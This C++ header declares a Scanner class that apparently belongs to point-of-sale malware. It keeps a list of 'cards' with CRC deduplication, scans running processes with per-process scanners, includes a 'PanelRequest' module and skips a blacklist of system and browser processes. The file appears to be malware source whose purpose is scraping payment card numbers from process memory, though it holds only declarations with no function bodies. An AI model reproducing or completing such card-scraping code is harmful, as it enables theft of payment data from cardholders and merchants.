#pragma once
#include <Windows.h>
#include "Settings.h"
#include "ProcScanner.h"
#include "PanelRequest.h"

#include <map>

static const char *blacklist[] = {
	"explorer.exe",
	"chrome.exe",
	"firefox.exe",
	"iexplore.exe",
	"svchost.exe",
	"smss.exe",
	"csrss.exe",
	"wininit.exe",
	"steam.exe",
	"devenv.exe",
	"thunderbird.exe",
	"skype.exe",
	"pidgin.exe",
	"services.exe",
	"dwm.exe",
	"dllhost.exe",
	"jusched.exe",
	"jucheck.exe",
	"lsass.exe",
	"winlogon.exe",
	"alg.exe",
	"wscntfy.exe",
	"taskmgr.exe",
	"spoolsv.exe",
	"QML.exe",
	"AKW.exe"
};

class Scanner
{
public:
	Scanner();
	~Scanner(void);

	void scan();
	bool found(std::string &card, ProcScanner *p);

	void procDone(ProcScanner *p);

	DWORD crc32(unsigned char *block, unsigned int length);

	static Scanner *instance();
private:
	std::map<DWORD, ProcScanner *> procs;
	CRITICAL_SECTION cp;
	
	std::vector<std::string> cards;
	std::set<DWORD> cardcrc;
	CRITICAL_SECTION cc;

	DWORD crc_tab[256];
	void crc32gentab();

	static void __stdcall monitorThread(Scanner *s);
};

